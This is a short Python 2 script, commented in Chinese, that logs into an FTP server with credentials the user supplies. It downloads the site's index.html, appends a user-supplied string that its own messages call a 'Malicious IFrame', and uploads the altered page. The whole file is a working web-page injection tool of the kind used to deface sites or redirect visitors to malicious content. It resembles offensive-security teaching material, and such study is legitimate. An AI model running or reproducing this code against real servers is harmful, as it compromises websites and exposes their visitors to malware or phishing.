#!/usr/bin/python
#coding=utf-8
import ftplib

def injectPage(ftp,page,redirect):
	f = open(page + '.tmp','w')
	#下载FTP文件
	ftp.retrlines('RETR ' + page,f.write)
	print '[+] Downloaded Page: ' + page
	f.write(redirect)
	f.close()
	print '[+] Injected Malicious IFrame on: ' + page
	#上传目标文件
	ftp.storlines('STOR ' + page,open(page + '.tmp'))
	print '[+] Uploaded Injected Page: ' + page
	print
def main():
	while True:
		host = raw_input('[*]Host >>> ')
		username = raw_input('[*]Username >>> ')
		password = raw_input('[*]Password >>> ')
		redirect = raw_input('[*]Redirect >>> ')
		print
		try:
			ftp = ftplib.FTP(host)
			ftp.login(username,password)
			injectPage(ftp,'index.html',redirect)
		except:
			print '[-] Logon failed.'

if __name__ == '__main__':
	main()